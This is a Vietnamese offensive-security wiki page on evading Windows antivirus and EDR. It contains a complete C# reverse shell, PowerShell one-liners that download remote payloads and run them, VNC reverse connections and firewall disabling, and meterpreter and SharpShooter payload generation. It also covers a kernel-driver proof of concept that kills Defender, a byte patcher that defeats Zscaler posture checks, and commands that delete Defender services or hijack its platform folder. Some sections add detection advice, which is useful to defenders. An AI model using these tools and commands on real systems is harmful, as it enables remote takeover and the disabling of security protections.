Né tránh là một chủ đề rất phức tạp; đôi khi bạn phải tính đến nhiều nguồn telemetry khác nhau chỉ trong một hệ thống, vì vậy gần như không thể hoàn toàn không bị phát hiện trong các môi trường trưởng thành.

Mỗi môi trường bạn nhắm đến đều có những điểm mạnh và điểm yếu riêng.

Tôi rất khuyến khích bạn xem bài nói chuyện này của [@ATTL4S](https://twitter.com/DaniLJ94) để có nền tảng về các kỹ thuật né tránh nâng cao hơn.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Đây cũng là một bài nói chuyện tuyệt vời khác của [@mariuszbit](https://twitter.com/mariuszbit) về né tránh chuyên sâu.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Kỹ thuật cũ**

### **Kiểm tra những phần nào bị Defender phát hiện là độc hại**

Bạn có thể dùng [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), công cụ này sẽ **loại bỏ từng phần của binary** cho đến khi **xác định được phần nào bị Defender** phát hiện là độc hại, rồi tách phần đó ra cho bạn.\
Một công cụ khác làm **điều tương tự là** [**avred**](https://github.com/dobin/avred), có dịch vụ web mở tại [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Cho đến Windows10, mọi Windows đều có sẵn **Telnet server** mà bạn có thể cài đặt (với quyền administrator) bằng cách chạy:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Hãy cấu hình để nó **khởi động** cùng hệ thống và **chạy** nó ngay bây giờ:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Thay đổi cổng telnet** (stealth) và tắt firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Tải xuống từ: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bạn cần các bản tải xuống bin, không phải bản setup)

**TRÊN HOST**: Chạy _**winvnc.exe**_ và cấu hình server:

- Bật tùy chọn _Disable TrayIcon_
- Đặt mật khẩu trong _VNC Password_
- Đặt mật khẩu trong _View-Only Password_

Sau đó, chuyển binary _**winvnc.exe**_ và file mới được tạo _**UltraVNC.ini**_ vào **nạn nhân**

#### **Reverse connection**

**Kẻ tấn công** nên **chạy trong** **host** của mình binary `vncviewer.exe -listen 5900` để sẵn sàng nhận **VNC connection** ngược. Sau đó, trong **nạn nhân**: Khởi động daemon winvnc bằng `winvnc.exe -run` và chạy `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**CẢNH BÁO:** Để duy trì tính bí mật, bạn không được thực hiện một số việc sau

- Đừng khởi động `winvnc` nếu nó đã chạy, nếu không bạn sẽ kích hoạt một [popup](https://i.imgur.com/1SROTTl.png). Kiểm tra xem nó có đang chạy hay không bằng `tasklist | findstr winvnc`
- Đừng khởi động `winvnc` khi không có `UltraVNC.ini` trong cùng thư mục, nếu không [cửa sổ cấu hình](https://i.imgur.com/rfMQWcf.png) sẽ mở ra
- Đừng chạy `winvnc -h` để xem trợ giúp, nếu không bạn sẽ kích hoạt một [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Tải xuống từ: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Bên trong GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Bây giờ **khởi động lister** bằng `msfconsole -r file.rc` và **thực thi** **payload xml** bằng:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender hiện tại sẽ kết thúc tiến trình rất nhanh.**

### Biên dịch reverse shell của riêng chúng ta

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell C# đầu tiên

Biên dịch bằng:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Sử dụng nó với:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### Sử dụng trình biên dịch C#

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Tự động tải xuống và thực thi:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Danh sách C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ví dụ sử dụng Python để xây dựng injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Các công cụ khác

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Thêm

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Vô hiệu hóa AV/EDR từ Kernel Space

Storm-2603 đã sử dụng một tiện ích console nhỏ có tên **Antivirus Terminator** để vô hiệu hóa các biện pháp bảo vệ endpoint trước khi thả ransomware. Công cụ này mang theo **driver dễ bị khai thác nhưng đã *được ký*** của riêng nó và lạm dụng driver để thực hiện các thao tác kernel đặc quyền mà ngay cả dịch vụ AV Protected-Process-Light (PPL) cũng không thể ngăn chặn.<sup>[[12]](#references)</sup>

Điểm chính
1. **Driver đã ký**: Tệp được đưa lên ổ đĩa là `ServiceMouse.sys`, nhưng binary thực chất là driver `AToolsKrnl64.sys` được ký hợp lệ của Antiy Labs, thuộc “System In-Depth Analysis Toolkit”. Vì driver có chữ ký Microsoft hợp lệ nên nó vẫn được tải ngay cả khi Driver-Signature-Enforcement (DSE) được bật.
2. **Cài đặt service**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Dòng đầu tiên đăng ký driver dưới dạng **kernel service** và dòng thứ hai khởi động driver, giúp `\\.\ServiceMouse` có thể truy cập từ userland.
3. **Các IOCTL do driver cung cấp**
   | Mã IOCTL | Khả năng                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Chấm dứt một process bất kỳ theo PID (dùng để kill các dịch vụ Defender/EDR) |
   | `0x990000D0` | Xóa một file bất kỳ trên đĩa |
   | `0x990001D0` | Gỡ driver và xóa service |

   Bằng chứng khái niệm C tối giản:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Vì sao cách này hiệu quả**: BYOVD bỏ qua hoàn toàn các biện pháp bảo vệ ở user-mode; mã chạy trong kernel có thể mở các tiến trình *được bảo vệ*, chấm dứt chúng hoặc can thiệp vào các đối tượng kernel bất kể PPL/PP, ELAM hay các tính năng hardening khác.

Phát hiện / Giảm thiểu
•  Bật danh sách chặn driver dễ bị tấn công của Microsoft (`HVCI`, `Smart App Control`) để Windows từ chối tải `AToolsKrnl64.sys`.
•  Giám sát việc tạo các dịch vụ *kernel* mới và cảnh báo khi driver được tải từ thư mục cho phép ghi công khai hoặc không có trong danh sách cho phép.
•  Theo dõi các handle từ user-mode đến đối tượng thiết bị tùy chỉnh, sau đó là các lệnh gọi `DeviceIoControl` đáng ngờ.

### Vượt qua kiểm tra Posture của Zscaler Client Connector bằng cách vá Binary trên đĩa

**Client Connector** của Zscaler áp dụng các quy tắc device-posture cục bộ và dựa vào Windows RPC để truyền kết quả đến các thành phần khác. Hai lựa chọn thiết kế yếu khiến có thể bypass hoàn toàn:

1. Việc đánh giá posture diễn ra **hoàn toàn ở phía client** (một giá trị boolean được gửi đến server).
2. Các endpoint RPC nội bộ chỉ xác thực rằng executable kết nối được **Zscaler ký** (thông qua `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Bằng cách **vá bốn binary đã ký trên đĩa**, có thể vô hiệu hóa cả hai cơ chế:

| Binary | Logic gốc được vá | Kết quả |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Luôn trả về `1`, nên mọi kiểm tra đều đạt yêu cầu |
| `ZSAService.exe` | Lệnh gọi gián tiếp đến `WinVerifyTrust` | Bị thay bằng NOP ⇒ mọi tiến trình (kể cả chưa được ký) đều có thể kết nối với các RPC pipe |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Được thay bằng `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Các kiểm tra integrity trên tunnel | Bị bỏ qua |

Trích đoạn patcher tối giản:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Sau khi thay thế các tệp gốc và khởi động lại ngăn xếp dịch vụ:

* **Tất cả** kiểm tra trạng thái tuân thủ đều hiển thị **xanh/đạt chuẩn**.
* Các binary chưa ký hoặc đã bị sửa đổi có thể mở các endpoint RPC named-pipe (ví dụ: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Máy chủ bị xâm nhập có quyền truy cập không hạn chế vào mạng nội bộ được xác định trong các chính sách Zscaler.

Nghiên cứu tình huống này cho thấy các quyết định tin cậy chỉ thực hiện ở phía client và những kiểm tra chữ ký đơn giản có thể bị đánh bại chỉ bằng vài bản vá byte.

## Microsoft Defender `BTR.sys` lạm dụng chức năng đáng tin cậy

Driver **Boot-Time Removal** của Defender là một ví dụ đối chiếu hữu ích với BYOVD kiểu cổ điển. `BTR.sys` là một thành phần khắc phục sự cố hợp lệ, được Microsoft ký, không có lỗi hỏng bộ nhớ và không có giao diện IOCTL; thay vào đó, sau khi có quyền administrator và `SeLoadDriverPrivilege`, operator có thể giả mạo giao dịch khắc phục riêng tư của driver để thực hiện các thao tác tệp/registry Ring-0 theo thiết kế. Đây là **primitive vô hiệu hóa AV/EDR sau khi xâm nhập, không phải truy cập ban đầu hay leo thang đặc quyền**, và có thể trích xuất driver từ tài nguyên `BOOTTIMETOOL` trong `MpEngine.dll` của chính mục tiêu, thay vì đưa vào một driver bên thứ ba dễ gây chú ý.<sup>[[36]](#references)</sup>

### Dàn dựng driver chạy một lần

Defender thường thả tài nguyên này dưới dạng tệp `[a-z]{8}.sys` ngẫu nhiên và đăng ký một kernel service có tên tương tự. `DriverEntry` đọc giá trị `Args` của service, mở NTFS ADS được tham chiếu, giải mã và xác thực danh sách hành động, ghi phản hồi, rồi trả về `0xC0000056` (`STATUS_DELETE_PENDING`) sau khi thực thi thành công để driver được unload thay vì tiếp tục thường trú. Một service giả mạo có các giá trị đặc trưng sau đây.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Luồng `:changelist` chứa một blob được mã hóa bằng RC4. Các bản build được phân tích sử dụng lại một khóa cố định dài 256 byte, nên mã hóa không phải là ranh giới phân quyền. Plaintext hợp lệ có header toàn cục dài 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC của header và transaction ID được tạo từ payload), theo sau là đường dẫn feedback dạng UTF-16 kết thúc bằng null và số lượng item tùy ý. Mỗi item có header dài 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), cùng dữ liệu riêng cho action kết thúc bằng **chính xác bốn byte NUL**. Mỗi vùng header/data được kiểm tra độc lập bằng CRC-32 với polynomial `0xEDB88320`, trạng thái khởi tạo `0xFFFFFFFF` và **không XOR cuối** (`~CRC32`); trạng thái CRC được đặt lại cho từng vùng.<sup>[[36]](#references)[[37]](#references)</sup>

Các ID action được chấp nhận cho phép sử dụng những primitive kernel sau.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dữ liệu item | Kết quả |
| --- | --- | --- |
| 1 | `[đường dẫn UTF-16]` | Xóa tệp, kể cả tệp đang bị khóa |
| 2 | `[đường dẫn UTF-16]` | Xóa thư mục rỗng |
| 3 | `[Flags][nguồn][đích]` | Di chuyển tệp đến đường dẫn được bảo vệ do attacker chọn; đích rỗng nghĩa là xóa |
| 4 | `[Flags][đường dẫn key]` | Xóa đệ quy một registry key |
| 5 | `[Flags][đường dẫn key + "\\" + value]` | Xóa một registry value |
| 6 | `[Flags][type][size][đường dẫn key + "\\" + value][data]` | Tạo/cập nhật registry value và tạo các đường dẫn key còn thiếu |

Với action 5 và 6, dấu phân tách key/value trên wire là **hai dấu gạch chéo ngược liên tiếp**; đường dẫn được định dạng theo quy ước sẽ không được tách chính xác. Tệp feedback phần lớn phản ánh request, nhưng bốn byte dữ liệu đầu tiên của mỗi item sẽ trở thành `NTSTATUS` trả về. Với action 1 và 2, vốn không có trường flags ở đầu, BTR dịch đường dẫn vào bốn byte dành riêng ở cuối để chừa chỗ cho status.<sup>[[36]](#references)</sup>

### Quy trình `BTR_CLI` và khoảng thời gian đầu quá trình khởi động

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) triển khai toàn bộ chuỗi: trích xuất `BTR.sys` từ Defender cục bộ, tạo `<random>.sys:changelist` và một luồng feedback, tuần tự hóa/tính checksum/mã hóa các action nối tiếp nhau, tạo trực tiếp registry key của service, sau đó gọi `NtLoadDriver` với `-trigger now` hoặc để driver khởi động cùng hệ thống bằng `-trigger boot`. Việc staging trực tiếp trong registry tránh đường dẫn SCM `CreateServiceW` thông thường, do đó **không tạo ra Event ID 7045 khi cài đặt service**. Các artifact được kích hoạt lúc boot có thể được xóa sau đó bằng `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` không thể sử dụng vì BTR thực hiện I/O tệp từ `DriverEntry` trước khi storage stack và liên kết `SystemRoot` sẵn sàng. Thay vào đó, `Start=1` cùng nhóm ưu tiên cao `Boot Bus Extender` sẽ thực thi ở Phase 1: NTFS có thể sử dụng, nhưng nhiều security driver khởi động cùng hệ thống và dịch vụ EDR ở user mode chưa khởi tạo. Các filter khởi động như `WdFilter` có thể đã được tải, nhưng BTR có thể xóa binary hoặc cấu hình dịch vụ của chúng trước lần khởi động tiếp theo, đồng thời xóa executable của dịch vụ trước khi SCM khởi chạy chúng. ELAM không khắc phục được lỗ hổng này vì BTR chạy sau khi đánh giá các driver khởi động và có chữ ký Microsoft hợp lệ.<sup>[[36]](#references)</sup>

Nhiều hành động được thực thi trong cùng một transaction. PoC thêm Action 1 vào đầu danh sách cho đường dẫn cố định `\SystemRoot\Temp\BootClean.log`: BTR tạo log này, sau đó xử lý yêu cầu xóa của chính nó và xóa log trước khi unload. Cách này giảm dấu vết, trong khi việc ghi phản hồi vào `<random>.sys:<random>.dat` cho phép xóa driver và cả hai stream cùng lúc.<sup>[[36]](#references)[[37]](#references)</sup>

### Tương quan phát hiện có tín hiệu cao

Các rule chỉ dựa trên chữ ký và danh sách chặn vulnerable driver của Microsoft không giải quyết được việc lạm dụng chức năng BTR vốn được thiết kế có chủ đích. Hãy ưu tiên các tương quan hành vi sau, đồng thời phân biệt nguồn gốc hợp lệ của Defender với một launcher bất kỳ.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Việc tạo `.sys:changelist` là dấu hiệu phổ biến của quá trình staging BTR. ADS `.dat` gắn với cùng tệp `.sys` đặc biệt đáng ngờ vì Defender hợp lệ thường lưu phản hồi bên dưới `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 không có System 7045:** Tương quan việc tạo trực tiếp `HKLM\SYSTEM\CurrentControlSet\Services\<random>` có chứa `Args=...:changelist` và `Group=Boot Bus Extender` nhưng không có sự kiện cài đặt SCM tương ứng.
- **Sysmon 6 -> 23:** Tương quan việc tải driver BTR đã biết từ nguồn không thuộc Defender với thao tác xóa tệp sau đó do `System`/PID 4 thực hiện, đặc biệt đối với các binary bảo mật.
- **Sysmon 11 -> 23:** Cảnh báo khi `System`/PID 4 nhanh chóng tạo rồi xóa `\SystemRoot\Temp\BootClean.log`.
- Hạn chế và kiểm tra việc cấp/bật `SeLoadDriverPrivilege`; chỉ riêng chữ ký Microsoft không đủ để xem là đáng tin khi driver của công cụ bảo mật được staging bởi `cmd.exe`, PowerShell hoặc một process không xác định.

## Lạm dụng Protected Process Light (PPL) để can thiệp AV/EDR bằng LOLBIN

Protected Process Light (PPL) thực thi hệ thống phân cấp signer/level, theo đó chỉ các protected process có cấp độ bằng hoặc cao hơn mới có thể can thiệp lẫn nhau. Về mặt tấn công, nếu có thể khởi chạy hợp lệ một binary hỗ trợ PPL và kiểm soát các đối số của nó, bạn có thể biến chức năng vô hại (ví dụ: logging) thành primitive ghi có giới hạn, được PPL bảo vệ, nhắm vào các thư mục được AV/EDR bảo vệ.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Điều kiện để một process chạy dưới dạng PPL
- EXE đích (và mọi DLL được tải) phải được ký bằng EKU hỗ trợ PPL.
- Process phải được tạo bằng CreateProcess với các flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Phải yêu cầu protection level tương thích với signer của binary (ví dụ: `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` cho signer anti-malware, `PROTECTION_LEVEL_WINDOWS` cho signer Windows). Yêu cầu sai level sẽ khiến quá trình tạo thất bại.

Xem thêm phần giới thiệu tổng quan về PP/PPL và bảo vệ LSASS tại đây:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Công cụ launcher
- Công cụ hỗ trợ mã nguồn mở: CreateProcessAsPPL (chọn protection level và chuyển tiếp đối số đến EXE đích):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Cách sử dụng:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Binary hệ thống đã ký `C:\Windows\System32\ClipUp.exe` tự khởi chạy tiến trình con và chấp nhận tham số để ghi tệp log vào đường dẫn do bên gọi chỉ định.
- Khi được khởi chạy dưới dạng tiến trình PPL, thao tác ghi tệp được bảo vệ bởi PPL.
- ClipUp không thể phân tích cú pháp các đường dẫn chứa dấu cách; hãy dùng đường dẫn ngắn 8.3 để trỏ đến các vị trí thường được bảo vệ.

Công cụ hỗ trợ đường dẫn ngắn 8.3
- Liệt kê tên ngắn: chạy `dir /x` trong từng thư mục cha.
- Tạo đường dẫn ngắn trong cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Chuỗi khai thác (khái quát)
1) Khởi chạy LOLBIN có khả năng chạy dưới dạng PPL (ClipUp) với `CREATE_PROTECTED_PROCESS` bằng một launcher (ví dụ: CreateProcessAsPPL).
2) Truyền tham số đường dẫn log của ClipUp để buộc tạo tệp trong thư mục AV được bảo vệ (ví dụ: Defender Platform). Dùng tên ngắn 8.3 nếu cần.
3) Nếu AV thường mở/khóa binary mục tiêu khi đang chạy (ví dụ: MsMpEng.exe), hãy lên lịch ghi tệp lúc khởi động trước khi AV bắt đầu chạy bằng cách cài đặt một dịch vụ tự khởi động chắc chắn chạy sớm hơn. Xác minh thứ tự khởi động bằng Process Monitor (boot logging).
4) Sau khi khởi động lại, thao tác ghi được PPL bảo vệ sẽ diễn ra trước khi AV khóa các binary của nó, làm hỏng tệp mục tiêu và ngăn AV khởi động.

Lệnh gọi ví dụ (đường dẫn đã được lược bỏ/rút gọn để an toàn):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Ghi chú và ràng buộc
- Bạn không thể kiểm soát nội dung mà ClipUp ghi ngoài vị trí ghi; primitive này phù hợp để gây hỏng dữ liệu hơn là chèn nội dung chính xác.
- Cần quyền local admin/SYSTEM để cài đặt/khởi động service và cần có thời gian khởi động lại.
- Thời điểm rất quan trọng: mục tiêu không được mở; thực thi lúc khởi động giúp tránh khóa tệp.

Phát hiện
- Việc tạo tiến trình `ClipUp.exe` với các đối số bất thường, đặc biệt khi được khởi chạy bởi các launcher không chuẩn, vào khoảng thời gian khởi động.
- Các service mới được cấu hình tự khởi động những binary đáng ngờ và liên tục khởi động trước Defender/AV. Điều tra việc tạo/chỉnh sửa service trước khi Defender khởi động thất bại.
- Giám sát tính toàn vẹn tệp đối với các binary/thư mục Platform của Defender; theo dõi việc tạo/chỉnh sửa tệp bất thường bởi các tiến trình có cờ protected-process.
- Telemetry ETW/EDR: tìm các tiến trình được tạo với `CREATE_PROTECTED_PROCESS` và việc sử dụng cấp độ PPL bất thường bởi các binary không phải AV.

Biện pháp giảm thiểu
- WDAC/Code Integrity: giới hạn những binary đã ký nào được phép chạy dưới dạng PPL và những tiến trình cha nào được phép khởi chạy chúng; chặn việc gọi ClipUp ngoài các ngữ cảnh hợp lệ.
- Quản lý service: hạn chế việc tạo/chỉnh sửa các service tự khởi động và giám sát thao tác thay đổi thứ tự khởi động.
- Đảm bảo tính năng tamper protection và bảo vệ early-launch của Defender được bật; điều tra các lỗi khởi động cho thấy binary bị hỏng.
- Cân nhắc tắt tính năng tạo tên ngắn 8.3 trên các volume lưu trữ công cụ bảo mật nếu môi trường của bạn tương thích (kiểm thử kỹ).

## Can thiệp Microsoft Defender qua chiếm quyền symlink thư mục phiên bản Platform

Windows Defender chọn platform để chạy bằng cách liệt kê các thư mục con trong:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Nó chọn thư mục con có chuỗi phiên bản theo thứ tự từ điển cao nhất (ví dụ: `4.18.25070.5-0`), sau đó khởi chạy các tiến trình service Defender từ thư mục đó (đồng thời cập nhật các đường dẫn service/registry). Việc chọn này tin cậy các mục thư mục, bao gồm cả directory reparse point (symlink). Quản trị viên có thể khai thác điều này để chuyển hướng Defender đến một đường dẫn mà attacker có thể ghi, từ đó thực hiện DLL sideloading hoặc làm gián đoạn service.<sup>[[21]](#references)[[22]](#references)</sup>

Điều kiện tiên quyết
- Local Administrator (cần để tạo thư mục/symlink trong thư mục Platform)
- Có khả năng khởi động lại hoặc kích hoạt Defender chọn lại platform (khởi động lại service khi khởi động hệ thống)
- Chỉ cần các công cụ có sẵn (mklink)

Vì sao hoạt động
- Defender chặn việc ghi vào các thư mục của chính nó, nhưng việc chọn platform lại tin cậy các mục thư mục và chọn phiên bản cao nhất theo thứ tự từ điển mà không xác thực rằng đích trỏ đến một đường dẫn được bảo vệ/đáng tin cậy.

Từng bước (ví dụ)
1) Chuẩn bị một bản sao có thể ghi của thư mục platform hiện tại, ví dụ: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Tạo symlink thư mục phiên bản cao hơn bên trong Platform trỏ đến thư mục của bạn:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Chọn trigger (khuyến nghị khởi động lại):
```cmd
shutdown /r /t 0
```
